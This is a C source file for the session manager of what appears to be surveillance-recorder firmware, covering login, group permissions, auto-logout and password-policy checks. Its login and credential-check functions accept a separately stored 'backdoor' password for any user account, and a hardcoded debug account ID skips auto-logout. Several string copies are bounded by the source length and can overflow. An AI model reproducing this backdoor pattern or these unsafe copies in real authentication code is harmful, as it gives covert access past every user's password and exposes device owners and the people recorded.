/*
 * ssm.c
 *  - session manager
 *
 * written by seongho
 *
 */

#include <string.h>
#include <glib.h>

#include "nfdal.h"
#include "ssm.h"
#include "nf_common.h"
#include "nf_event.h"


#include "viewers/objects/nfwindow.h"
#include "scm.h"
#include "tmr.h"
#include "nfdal.h"
#include "uxm.h"
#include "evt.h"
#include "ix_conf.h"
#include "support/event_loop.h"
#include "nf_action.h"

DECLARE DBG_SYSTEM

#define DBG_LEVEL		DBG_CONF
#define DBG_MODULE		"SSM"

#define UA_STRING_SIZE			(16)


////////////////////////////////////////////////////////////
//
// private data type 
//

enum {
	WORKING = 1,
	STOP	= 0,
};

typedef enum _GROUP_E {
	GRP_ADMIN 	= 0,
	GRP_MANAGER = 1,
	GRP_USER    = 2,
	GRP_LOGOFF 	= 3,
} GROUP_E;

typedef struct _USER_AUTH_T {
	int		u_idx;
	gchar 	u_id[UA_STRING_SIZE];
	gchar 	u_pwd[UA_STRING_SIZE+1];
	gchar 	u_grp[UA_STRING_SIZE];
	guint 	u_auth;
} USER_AUTH_T;

gchar 	u_id_prev[UA_STRING_SIZE];

typedef struct _ALT_T {
	int 	al_wait;
	TIMERID	al_timer;
	int		is_working;
	int		dbg_alt;
} ALT_T;

typedef struct _SSM_T {
	USER_AUTH_T	ua;
	ALT_T		al;
} SSM_T;


////////////////////////////////////////////////////////////
//
// private variable
//

static SSM_T issm;


////////////////////////////////////////////////////////////
//
// private functions
//

static int _backup_user(gint usr_idx)
{
	FILE *fp;

	fp = fopen("./data/gui/login_user.itx", "w");
	if(fp){		
		fprintf(fp, "%d", usr_idx);	
		fclose(fp);
	}

	return 1;
}

static int _set_auth_by_group(SSM_T *pissm, GROUP_E group)
{
	UserAuthData auth_d;
	DAL_get_userAuth_data(&auth_d, group);
	pissm->ua.u_auth = 0;
	pissm->ua.u_auth |= (auth_d.sys_setup	<< USR_AUTH_SYS_SETUP);
	pissm->ua.u_auth |= (auth_d.search   	<< USR_AUTH_SEARCH);
	pissm->ua.u_auth |= (auth_d.archive  	<< USR_AUTH_ARCHIVE);
	pissm->ua.u_auth |= (auth_d.rec_setup  << USR_AUTH_RECORD_SETUP);
	pissm->ua.u_auth |= (auth_d.event  	<< USR_AUTH_EVENT);
	pissm->ua.u_auth |= (auth_d.audio  	<< USR_AUTH_AUDIO);
	pissm->ua.u_auth |= (auth_d.microphone	<< USR_AUTH_MIC);
	pissm->ua.u_auth |= (auth_d.remote   	<< USR_AUTH_REMOTE);
	pissm->ua.u_auth |= (auth_d.ptz   	<< USR_AUTH_PTZ);	
	pissm->ua.u_auth |= (auth_d.shutdown  	<< USR_AUTH_SHUTDOWN);
	pissm->ua.u_auth |= (auth_d.cvt_disp  	<< USR_AUTH_COVERT);
    pissm->ua.u_auth |= (auth_d.sequrinet   << USR_AUTH_SEQURINET);
	DMSG(1, "AUTH VALUE = [%X]", pissm->ua.u_auth);
}

static int _find_user_index(char *user_id)
{
	int cnt;
	int i;
	char strID[UA_STRING_SIZE];
	cnt = DAL_get_user_count();

	if (!user_id) return -1;
	if (strlen(user_id) == 0) return -1;

	for (i = 0; i < cnt; ++i) {
		memset(strID, 0x00, UA_STRING_SIZE);
		DAL_get_user_id(strID, i);
		if (strcmp(strID, user_id) == 0) return i;
	}

	return -1;
}

static int _init_session(SSM_T *pissm)
{
	memset(&pissm->ua, 0x00, sizeof(USER_AUTH_T));
	pissm->ua.u_idx = -1;

	_set_auth_by_group(pissm, GRP_LOGOFF);

    if (pissm->ua.u_auth & (1 << USR_AUTH_AUDIO)) {
        scm_turnon_live_audio();
    }
    else {
    	scm_turnoff_live_audio();
    }
    
    if (pissm->ua.u_auth & (1 << USR_AUTH_MIC)) {
        scm_turnon_mic();
    }
    else {
    	scm_turnoff_mic();
    }
	nf_action_set_action_ctrl(FALSE);
	return 0;
}

static int _init_alt(SSM_T *pissm)
{
	if (pissm->al.al_timer) {
		tmr_free(pissm->al.al_timer);
		pissm->al.al_timer = 0;
	}
	pissm->al.al_wait = 0;
	pissm->al.is_working = STOP;
	return 0;
}

static void set_active_user_data(gchar *act_id, gchar *act_pwd, guint act_idx)
{
	UserAuthData auth_d;
	GROUP_E grp = GRP_LOGOFF;
	gchar buf[UA_STRING_SIZE];

	_init_session(&issm);
	
	// act user index in DB
	issm.ua.u_idx = act_idx;

	// set id/password
	if (act_id) {
		strncpy(issm.ua.u_id, act_id, strlen(act_id));
		strncpy(u_id_prev, issm.ua.u_id, strlen(issm.ua.u_id));
	}
	if (act_pwd) strncpy(issm.ua.u_pwd, act_pwd, strlen(act_pwd));


	// set group
	DAL_get_user_group(buf, act_idx);
	strncpy(issm.ua.u_grp, buf, strlen(buf));

	// set group auth
	DMSG(1, "ID = [%s]", issm.ua.u_id);
	DMSG(1, "GROUP = [%s]", issm.ua.u_grp);
	if(!strcmp(issm.ua.u_grp, "ADMIN")) 		grp = GRP_ADMIN;	
	else if(!strcmp(issm.ua.u_grp, "MANAGER")) 	grp = GRP_MANAGER;
	else if(!strcmp(issm.ua.u_grp, "USER")) 	grp = GRP_USER;
	else									 	grp = GRP_LOGOFF;

	_set_auth_by_group(&issm, grp);

    if (issm.ua.u_auth & (1 << USR_AUTH_AUDIO)) {
        scm_turnon_live_audio();
    }
    else {
        scm_turnoff_live_audio();
    }
    
    if (issm.ua.u_auth & (1 << USR_AUTH_MIC)) {
        scm_turnon_mic();
    }
    else {
        scm_turnoff_mic();
    }
    
	if (issm.ua.u_auth & (1 << USR_AUTH_EVENT)) nf_action_set_action_ctrl(TRUE);

#if 0
	g_message("user auth:::::::::::\n group: %s[index %d]\n sys setup: %d\n search: %d\n archive: %d\n rec setup: %d\n event: %d \n audio: %d\n mic: %d\n remote: %d\n shutdown: %d\n ::::::::::::::::::::::::",
			issm.ua.u_grp,
			issm.ua.u_idx,
			auth_d.sys_setup,
			auth_d.search,
			auth_d.archive,
			auth_d.rec_setup,
			auth_d.event,
			auth_d.audio,
			auth_d.microphone,
			auth_d.remote,
			auth_d.shutdown);
#endif
}

static gboolean _proc_logout(void *data)
{
	SSM_T *pissm = (SSM_T *)data;

	DMSG(1, "START CLOSING PROCESS\n");
	// sequencial closing, because wnd module only support one window exiting at one time,	
	if (nfui_nfwindow_find("USER PASSWORD")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("USER PASSWORD", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [USER PASSWORD]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	if (nfui_nfwindow_find("PTZ CTRL")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("PTZ CTRL", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [PTZ CTRL]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	if (nfui_nfwindow_find("DIGITAL ZOOM")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("DIGITAL ZOOM", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [DIGITAL ZOOM]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	if (nfui_nfwindow_find("PLAYBACK")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("PLAYBACK", NFEVENT_EXIT_PLAYBACK, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [PLAYBACK]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	pissm->al.al_wait = 0;
	if (nfui_nfwindow_find("SEARCH")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("SEARCH", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [SEARCH]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	pissm->al.al_wait = 0;
	if (nfui_nfwindow_find("ARCHIVING")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("ARCHIVING", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [ARCHIVING]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	pissm->al.al_wait = 0;
	if (nfui_nfwindow_find("SYSTEM SETUP")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("SYSTEM SETUP", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [SYSTEM SETUP]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;

	pissm->al.al_wait = 0;
	if (nfui_nfwindow_find("RECORD SETUP")) {
		if (pissm->al.al_wait) return TRUE;
		evt_send_to_window("RECORD SETUP", WND_CLOSE, 0, 0, 0);
		pissm->al.al_wait = 1;
		DMSG(1, "TRY TO CLOSE [RECORD SETUP]\n");
		return TRUE;
	}
	else pissm->al.al_wait = 0;
	
	pissm->al.al_wait = 0;
    //uxm_leave_from_live();
    evt_send_to_local(INFY_LEAVE_LIVE, 0, 0, 0);
	DMSG(1, "ALL WINDOWS ARE CLOSED AUTOMATICALLY.\n");
	return FALSE;
}

static int _reset_alt(SSM_T *pissm)
{
	LogoutData lo_data;
	int dr;

	DMSG(9, "");
	DAL_get_logout_data(&lo_data);
	if (lo_data.autoLogout != 0) {
		if (pissm->al.al_timer) tmr_free(pissm->al.al_timer);
		if (pissm->al.dbg_alt != 0) dr = pissm->al.dbg_alt;
		else dr = lo_data.duration * 60;
		DMSG(1, "AUTO LOGOUT TIMER INIT = [%d]sec\n", dr);
		pissm->al.al_timer = tmr_new(dr, CMMPT_SCM, INFY_ALT_EXPIRED);
		pissm->al.is_working = STOP;
	}	
	return 0;
}

static int _start_alt_timer(SSM_T *pissm)
{
	LogoutData lo_data;

	DAL_get_logout_data(&lo_data);
	if (lo_data.autoLogout != 0) {
		tmr_start(pissm->al.al_timer);
		pissm->al.is_working = WORKING;
	}
	return 0;
}

static int _stop_alt_timer(SSM_T *pissm)
{
	tmr_stop(pissm->al.al_timer);
	pissm->al.is_working = STOP;
	return 0;
}

static int _is_alt_working(SSM_T *pissm)
{
	return pissm->al.is_working;
}

static int _read_conf(SSM_T *pissm)
{
	int ret;
	ret = icf_get_value_by_int("ssm", "dmsg");
	if (ret != -1) DBG_USE(ret);

	ret = icf_get_value_by_int("ssm", "dbg_alt");
	if (ret != -1) pissm->al.dbg_alt = (ret > 0) ? ret : 0;

	return 0;
}

static int _get_remain_day_to_expire(int user_idx)
{
	int remains = 0;
	GTimeVal c_tv;
	GTimeVal tmp_tv;
	
	GDate today;
	GDate skip;
	GDate expired_day;

	gint expired_term = -1;

	expired_term = DAL_get_pw_expired_conf();
	if(expired_term <= 0)	return -1;
	else					expired_term *= 30;

	// today date
	memset(&c_tv, 0, sizeof(GTimeVal));
	gettimeofday(&c_tv, 0);
	g_date_set_time_val(&today, &c_tv);

	memset(&tmp_tv, 0, sizeof(GTimeVal));
	tmp_tv.tv_sec = DAL_get_expire_check_time(user_idx);
	g_date_set_time_val(&skip, &tmp_tv);

	if (g_date_compare(&today, &skip) == 0) return -1;

	memset(&tmp_tv, 0, sizeof(GTimeVal));
	tmp_tv.tv_sec = DAL_get_pw_last_changed_time(user_idx);
	g_date_set_time_val(&expired_day, &tmp_tv);
	g_date_add_days(&expired_day, expired_term);

	remains = g_date_days_between(&today, &expired_day);
	if (remains <= 0) remains = 0;
	else remains = -1;

	// n > 0 : the days remained
	// 0 : need to change
	// -1 : don't need to change
	return remains;
}

static BITMASK _get_covert_mask(gchar *login_group, gchar *usr_name)
{
    gint i;
    
    BITMASK covert_mask = 0;
    CameraData camdata[GUI_CHANNEL_CNT];

    guint user_cnt;
    UserManageData userdata;

    for(i = 0; i < GUI_CHANNEL_CNT; i++)
        DAL_get_covert_data(&camdata[i], i);

    user_cnt = DAL_get_user_count();

    if (!strcmp(login_group, "ADMIN"))
    {
        for (i = 0; i < user_cnt; i++)
        {
            DAL_get_userManage_data(&userdata, i);      
            if (!strcmp(userdata.id, usr_name)) break;
        }

        if (i == user_cnt) {
            g_message("%s, %d not find :%s", __FUNCTION__, __LINE__, usr_name);
            return 0;
        }

        for (i = 0; i < GUI_CHANNEL_CNT; i++)
        {
            if ((camdata[i].admin) || (userdata.covert[i] == '1'))  covert_mask |= (1 << i);
        }
    }
    else if (!strcmp(login_group, "MANAGER"))
    {
        for (i = 0; i < user_cnt; i++)
        {
            DAL_get_userManage_data(&userdata, i);      
            if (!strcmp(userdata.id, usr_name)) break;
        }
        
        if (i == user_cnt) {
            g_message("%s, %d not find :%s", __FUNCTION__, __LINE__, usr_name);
            return 0;
        }

        for (i = 0; i < GUI_CHANNEL_CNT; i++)
        {
            if ((camdata[i].manager) || (userdata.covert[i] == '1'))    covert_mask |= (1 << i);
        }
    }
    else if (!strcmp(login_group, "USER"))
    {
        for (i = 0; i < user_cnt; i++)
        {
            DAL_get_userManage_data(&userdata, i);      
            if (!strcmp(userdata.id, usr_name)) break;
        }

        if (i == user_cnt) {
            g_message("%s, %d not find :%s", __FUNCTION__, __LINE__, usr_name);
            return 0;
        }
    
        for (i = 0; i < GUI_CHANNEL_CNT; i++)
        {
            if ((camdata[i].user) || (userdata.covert[i] == '1'))   covert_mask |= (1 << i);
        }
    }
    else        // logoff
    {
        for (i = 0; i < GUI_CHANNEL_CNT; i++)
        {
            if (camdata[i].logoff)  covert_mask |= (1 << i);
        }
    }

    return covert_mask;
}

// PASSWORD check
static gboolean _is_number(gchar *pw)
{
	while((*pw) != NULL)
	{
		if(isdigit(*pw))
			return TRUE;

		pw++;
	}

	return FALSE;

}

// PASSWORD check
static gboolean _is_upper(gchar *pw)
{
	while((*pw) != NULL)
	{
		if(isupper(*pw))
			return TRUE;

		pw++;
	}

	return FALSE;
}

// PASSWORD check
static gboolean _is_lower(gchar *pw)
{
	while((*pw) != NULL)
	{
		if(islower(*pw))
			return TRUE;

		pw++;
	}

	return FALSE;
}

// PASSWORD check
static gboolean _is_special_char(gchar *pw)
{
    if(isalpha(*pw) || isdigit(*pw))
        return FALSE;

    return TRUE;
}

static gboolean _is_special(gchar *pw)
{
	gint i;
	while((*pw) != NULL)
	{
        if(_is_special_char(pw))
            return TRUE;

		pw++;
	}

	return FALSE;
}

// PASSWORD check
static gboolean _is_same_char(gchar *pw)
{
	gint same_ch_cnt = 0;

	while((*pw) != NULL)
	{
		if( !((*pw) - *(pw+1)))
			same_ch_cnt++;
		else
			same_ch_cnt = 0;

		if(same_ch_cnt == 2)
			return FALSE;

		pw++;
	}

	return TRUE;
}

static gboolean _is_consective_char(gchar *pw)
{
	gint con_num_cnt = 1;

	while((*pw) != NULL)
	{

        if(_is_special_char(pw))
			con_num_cnt = 1;
        else if( abs((*pw) - *(pw+1)) == 1 )
			con_num_cnt++;
		else if(isdigit(*pw) && ( abs((*pw) - *(pw+1)) == 9 ))
			con_num_cnt++;
		else
			con_num_cnt = 1;

		if(con_num_cnt == 3)
		{
			if(*(pw-1) != *(pw+1))
				return FALSE;

//			con_num_cnt = 1;
			con_num_cnt--;
		}

		pw++;
	}

	return TRUE;
}

static gboolean _is_include_id(gchar *id, gchar *pw)
{
    if (strstr(pw, id) != NULL)
        return FALSE;

	return TRUE;
}


////////////////////////////////////////////////////////////
//
// public interfaces
//

int ssm_init()
{
	memset(&issm, 0x00, sizeof(SSM_T));
	memset(u_id_prev, 0x00, sizeof(u_id_prev));
	_init_session(&issm);
	_read_conf(&issm);
	return 0;
}

int ssm_init_auth()
{
	_init_session(&issm);
	_init_alt(&issm);
	return 0;
}

void ssm_logout()
{
	_init_session(&issm);
	_init_alt(&issm);
	_backup_user(-1);

	nf_notify_fire_chmap("login_user", "");	
}

void ssm_shutdown()
{
	_backup_user(-1);
}

void ssm_update_auth()
{
	UserManageData user_d;
	UserAuthData auth_d;
	gchar buf[UA_STRING_SIZE];
	guint user_cnt;
	gint i;

	memset(&issm.ua.u_auth, 0x00, sizeof(guint));

	scm_turnoff_mic();

	if (issm.ua.u_idx == -1) {
		DAL_get_userAuth_data(&auth_d, 3);

		issm.ua.u_auth |= (auth_d.sys_setup	<< USR_AUTH_SYS_SETUP);
		issm.ua.u_auth |= (auth_d.search   	<< USR_AUTH_SEARCH);
		issm.ua.u_auth |= (auth_d.archive  	<< USR_AUTH_ARCHIVE);
		issm.ua.u_auth |= (auth_d.rec_setup  << USR_AUTH_RECORD_SETUP);
		issm.ua.u_auth |= (auth_d.event  	<< USR_AUTH_EVENT);
		issm.ua.u_auth |= (auth_d.audio  	<< USR_AUTH_AUDIO);
		issm.ua.u_auth |= (auth_d.microphone	<< USR_AUTH_MIC);
		issm.ua.u_auth |= (auth_d.remote   	<< USR_AUTH_REMOTE);
		issm.ua.u_auth |= (auth_d.ptz   	<< USR_AUTH_PTZ);		
		issm.ua.u_auth |= (auth_d.shutdown  	<< USR_AUTH_SHUTDOWN);
		issm.ua.u_auth |= (auth_d.cvt_disp  	<< USR_AUTH_COVERT);
        issm.ua.u_auth |= (auth_d.sequrinet << USR_AUTH_SEQURINET);
		DMSG(1, "AUTH VALUE = [%X]", issm.ua.u_auth);

		if (issm.ua.u_auth & (1 << USR_AUTH_MIC)) scm_turnon_mic();
	}
	else 
	{
		user_cnt = DAL_get_user_count();
	
		if (issm.ua.u_idx >= user_cnt) 
		{
			ssm_logout();
            //uxm_leave_from_live();
            evt_send_to_local(INFY_LEAVE_LIVE, 0, 0, 0);
		}
		else
		{
			memset(&user_d, 0x00, sizeof(UserManageData));
			DAL_get_userManage_data(&user_d, issm.ua.u_idx);

			if (ssm_is_cur_user(user_d.id, user_d.pw) == FALSE)
			{
				ssm_logout();
                //uxm_leave_from_live();
                evt_send_to_local(INFY_LEAVE_LIVE, 0, 0, 0);
			}
			else
			{
				// update id/password
				DAL_get_user_id(issm.ua.u_id, issm.ua.u_idx);
				DAL_get_user_passwd(issm.ua.u_pwd, issm.ua.u_idx);

				// set group
				DAL_get_user_group(buf, issm.ua.u_idx);
				strncpy(issm.ua.u_grp, buf, strlen(buf));

				// set group auth
				DMSG(1, "ID = [%s]", issm.ua.u_id);
				DMSG(1, "GROUP = [%s]", issm.ua.u_grp);
				if(!strcmp(issm.ua.u_grp, "ADMIN")) 			DAL_get_userAuth_data(&auth_d, 0);
				else if(!strcmp(issm.ua.u_grp, "MANAGER")) 	    DAL_get_userAuth_data(&auth_d, 1);
				else if(!strcmp(issm.ua.u_grp, "USER")) 		DAL_get_userAuth_data(&auth_d, 2);
				else if(!strcmp(issm.ua.u_grp, "LOGOFF")) 		DAL_get_userAuth_data(&auth_d, 3);

				issm.ua.u_auth |= (auth_d.sys_setup	<< USR_AUTH_SYS_SETUP);
				issm.ua.u_auth |= (auth_d.search   	<< USR_AUTH_SEARCH);
				issm.ua.u_auth |= (auth_d.archive  	<< USR_AUTH_ARCHIVE);
				issm.ua.u_auth |= (auth_d.rec_setup  << USR_AUTH_RECORD_SETUP);
				issm.ua.u_auth |= (auth_d.event  	<< USR_AUTH_EVENT);
				issm.ua.u_auth |= (auth_d.audio  	<< USR_AUTH_AUDIO);
				issm.ua.u_auth |= (auth_d.microphone	<< USR_AUTH_MIC);
				issm.ua.u_auth |= (auth_d.remote   	<< USR_AUTH_REMOTE);
				issm.ua.u_auth |= (auth_d.ptz   	<< USR_AUTH_PTZ);				
				issm.ua.u_auth |= (auth_d.shutdown  	<< USR_AUTH_SHUTDOWN);
				issm.ua.u_auth |= (auth_d.cvt_disp  	<< USR_AUTH_COVERT);
                issm.ua.u_auth |= (auth_d.sequrinet << USR_AUTH_SEQURINET);
				DMSG(1, "AUTH VALUE = [%X]", issm.ua.u_auth);

				if (issm.ua.u_auth & (1 << USR_AUTH_MIC))   scm_turnon_mic();
			}
		}
	}

}

gboolean ssm_logon(gchar *id, gchar* password)
{
	guint i;
	guint cnt;
	gchar strID[UA_STRING_SIZE];
	gchar strPWD[UA_STRING_SIZE+1];
	gchar backdoor[16];
	
	cnt = DAL_get_user_count();

	memset(backdoor, 0x00, sizeof(backdoor));
	var_get_backdoor_password(backdoor);

	for (i = 0; i < cnt; i++) 
	{
		memset(strID, 0x00, sizeof(strID));
		memset(strPWD, 0x00, sizeof(strPWD));

		DAL_get_user_id(strID, i);
		DAL_get_user_passwd(strPWD, i);

		if (strcmp(strID, id) == 0) 
		{
			if ((strcmp(strPWD, password) == 0) || (strlen(backdoor) && (strcmp(backdoor, password) == 0)))
			{
				set_active_user_data(strID, strPWD, i);
				nf_event_logon_fail_check(id, 0, 1);
				nf_notify_fire_chmap("login_user", id);
				if(ivsc.dfunc.support_autologout_on_reboot) _backup_user(i);
				return TRUE;
			}
		}
	}

	nf_event_logon_fail_check(id, 1, 1);
	return FALSE;
}

gboolean ssm_check_id_passwd(gchar *id, gchar* password)
{
	guint i;
	guint cnt;
	gchar strID[UA_STRING_SIZE];
	gchar strPWD[UA_STRING_SIZE+1];
	gchar backdoor[16];
	
	cnt = DAL_get_user_count();

	memset(backdoor, 0x00, sizeof(backdoor));	
	var_get_backdoor_password(backdoor);

	for (i = 0; i < cnt; i++) 
	{
		memset(strID, 0x00, sizeof(strID));
		memset(strPWD, 0x00, sizeof(strPWD));

		DAL_get_user_id(strID, i);
		DAL_get_user_passwd(strPWD, i);

		if (strcmp(strID, id) == 0) 
		{
			if ((strcmp(strPWD, password) == 0) || (strlen(backdoor) && (strcmp(backdoor, password) == 0))) return TRUE;
		}
	}

	return FALSE;
}

gboolean ssm_is_cur_user(gchar *id, gchar *password)
{
	gchar backdoor[16];

	memset(backdoor, 0x00, sizeof(backdoor));
	var_get_backdoor_password(backdoor);

	if (strcmp(issm.ua.u_id, id) == 0)
	{
		if ((strcmp(issm.ua.u_pwd, password) == 0) || (strlen(backdoor) && (strcmp(backdoor, password) == 0))) return TRUE;
	}

	return FALSE;
}

gboolean ssm_check_access_auth(UsrAuth auth)
{
	if(issm.ua.u_auth & (1 << auth)) {
		return TRUE;
	}

	return FALSE;
}

gchar* ssm_get_cur_id(char *buf)
{
	if(buf)
		strcpy(buf, issm.ua.u_id);

	return issm.ua.u_id;
}

gchar* ssm_get_prev_id(char *buf)
{
	if(buf)
		strcpy(buf, u_id_prev);

	return u_id_prev;
}

gboolean ssm_is_logon_user(char *user_id)
{
	int ret = strcmp(user_id, issm.ua.u_id);
	return (ret == 0);
}

gboolean ssm_is_admin()
{
	return (strcmp(issm.ua.u_id, "ADMIN") == 0);
}

gboolean ssm_is_itxdebug_id()
{
	return (strcmp(issm.ua.u_id, "debug4itxR") == 0);
}

void ssm_get_cur_group(char *buf)
{
	if(buf)
		strcpy(buf, issm.ua.u_grp);
}

gint ssm_get_cur_grp_idx()
{
    gint idx, i;
    gchar group[16];

    DAL_get_user_group(group, ssm_get_cur_idx());

    if (!strcmp(group, "ADMIN"))
    {
        idx = 0;
    }
    else if (!strcmp(group, "MANAGER"))
    {
        idx = 1;
    }
    else if (!strcmp(group, "USER"))
    {
        idx = 2;
    }
    else        // logoff
    {
        idx = 4;
    }

    return idx;
}

gint ssm_get_cur_idx()
{
	if(!strlen(issm.ua.u_id))
		return -1;

	return issm.ua.u_idx;
}

gint ssm_get_usr_idx(char *user_id)
{
	int idx;

	idx = _find_user_index(user_id);
	if (idx == -1) return -1;

	return idx;
}

int ssm_get_remain_day_to_expire()
{
	int remain = 0;
	if (issm.ua.u_idx == -1) return -1;

	remain = _get_remain_day_to_expire(issm.ua.u_idx);
	return remain;
}

int ssm_get_remain_day_to_expire_user(char *user_id)
{
	int idx;
	int remain = 0;
	idx = _find_user_index(user_id);
	if (idx == -1) return -1;

	remain = _get_remain_day_to_expire(idx);
	return remain;
}

guint ssm_get_covert_mask()
{   
    BITMASK covert_mask = 0;

    covert_mask = _get_covert_mask(issm.ua.u_grp, issm.ua.u_id);
    return covert_mask;
}

gboolean ssm_get_covert_shown_as()
{
    return DAL_get_grp_covert_shown_as(ssm_get_cur_grp_idx());
}

int ssm_init_auto_logout()
{
	DMSG(1, "");
	_reset_alt(&issm);
	return 0;
}

int ssm_start_auto_logout()
{
	DMSG(1, "");
	_start_alt_timer(&issm);
	return 0;
}

int ssm_fakestart_auto_logout()
{
	DMSG(1, "");
	if (_is_alt_working(&issm)) _start_alt_timer(&issm);
	return 0;
}

int ssm_reconfig_auto_logout()
{
	DMSG(1, "");
	tmr_stop(issm.al.al_timer);
	_reset_alt(&issm);
	_start_alt_timer(&issm);
	return 0;
}

int ssm_stop_auto_logout()
{
	DMSG(1, "");
	_stop_alt_timer(&issm);
	return 0;
}

int ssm_fakestop_auto_logout()
{
	DMSG(1, "");
	tmr_stop(issm.al.al_timer);
	return 0;
}

int ssm_reset_auto_logout_timer()
{
	tmr_reset(issm.al.al_timer);
	return 0;
}

int ssm_set_new_user(char *id)
{
	// if you use the id, check the caller of this function
	DMSG(1, "");
	_reset_alt(&issm);
	_start_alt_timer(&issm);
	return 0;
}

int ssm_run_auto_logout()
{
    if (ssm_is_itxdebug_id() && (issm.al.is_working == STOP || tmr_is_running(issm.al.al_timer) == 0)) {
        DMSG(1, "auto logout is STOP!!!");
        return 0;
    }
    
	tmr_stop(issm.al.al_timer);
	issm.al.al_wait = 0;
	g_timeout_add(300, _proc_logout, &issm);	
	tmr_free(issm.al.al_timer);
	issm.al.al_timer = 0;
	return 0;
}

gboolean ssm_check_passwd(gchar* password)
{
	gint pswordLen = 0;
	gint pswordtype = 0;

	// length : more 8, less 16	
	pswordLen = strlen(password);
	if( (pswordLen < 8) || (pswordLen > 16) )
	{
		return FALSE;
	}
	
	// font type number
	// number, upper, lower, special
	if(_is_number(password))
		pswordtype++;

	if(_is_upper(password))
		pswordtype++;

	if(_is_lower(password))
		pswordtype++;

	if(_is_special(password))
		pswordtype++;
	
	if(pswordtype < 3)
	{
		return FALSE;
	}
	
	// check same char
	if(!_is_same_char(password))
	{
		return FALSE;
	}

	// check consective num
	if(!_is_consective_char(password))
	{
		return FALSE;
	}
	return TRUE;

}

guint ssm_check_enhanced_passwd(gchar* id, gchar* password)
{
	gint idLen = 0;
	gint pswordLen = 0;
	gint pswordtype = 0;
    guint result = PASS_SUCCESS;

	idLen = strlen(id);
    pswordLen = strlen(password);
    
	// length : more 8, less 16	
	if ((pswordLen < 8) || (pswordLen > 16))
		result |= PASS_ERROR_LENGTH;
	
	if(_is_number(password)) pswordtype++;
	if(_is_upper(password))	pswordtype++;
	if(_is_lower(password)) pswordtype++;
	if(_is_special(password)) pswordtype++;

	// number, upper, lower, special    	
	if (pswordtype < 4)
		result |= PASS_ERROR_CATEGORY;		
	
	// check same char
	if(!_is_same_char(password))
		result |= PASS_ERROR_3REPEAT;		

	// check consective num
	if(!_is_consective_char(password))
		result |= PASS_ERROR_SEQUENTIAL;

    if (idLen)
    {
    	// check include id
    	if(!_is_include_id(id, password))
    		result |= PASS_ERROR_INCLUDE_ID;
    }
	
	return result;
}

